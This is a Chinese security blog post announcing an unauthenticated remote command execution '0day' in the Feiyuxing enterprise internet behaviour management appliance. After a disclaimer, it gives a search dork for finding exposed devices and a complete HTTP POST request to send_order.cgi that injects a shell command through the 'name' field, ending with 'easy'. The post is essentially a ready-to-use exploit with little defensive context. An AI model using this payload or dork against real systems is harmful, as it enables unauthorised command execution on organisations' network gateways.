#  0day！！0day！！—RCE—飞鱼星上网行为管理系统企业版前台   
红队传奇林先生  月落安全   2024-03-20 23:52  
  
**免责声明**  
  
**月落星沉研究室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为！！！**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/DBoCyk48rwBO8CmYFIwBB2FIDKdqdviae7cB0A0UlTm0ZpjF9MEBX4zlXg0qwFCRxoBOyuOMpft1bxROqbibmFicQ/640?wx_fmt=gif "")  
  
**飞鱼星上网行为管理系统企业版前台RCE**  
  
**title="飞鱼星企业"**  
  
影响版本：  
飞鱼星企业级智能上网行为管理系统企业版  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/DBoCyk48rwAUMmLHIxRgUvX3WSnCe8l5icib0ANWXeFyyORlQdU0cRAFGtshAnOBA85OaGx8ldpBmSHAnFeicC2Xw/640?wx_fmt=gif "")  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBoCyk48rwDfFjtc749M6AsGw4DrApHvnGpPONVupEvME73cPJKEvto3vmWVbVqkhwLgUobfGSeXQOXtnKG9eQ/640?wx_fmt=png&from=appmsg "")  
```
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

{"opid":"777777777777777777","name":";uname -a;echo ","type":"rest"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBoCyk48rwDfFjtc749M6AsGw4DrApHvbqtqw6FxA7QEPfFHlgM2YhskTka6UQQyiaQxdes4qLsYzHka2qFb1nQ/640?wx_fmt=png&from=appmsg "")  
  
easy！！！  
  
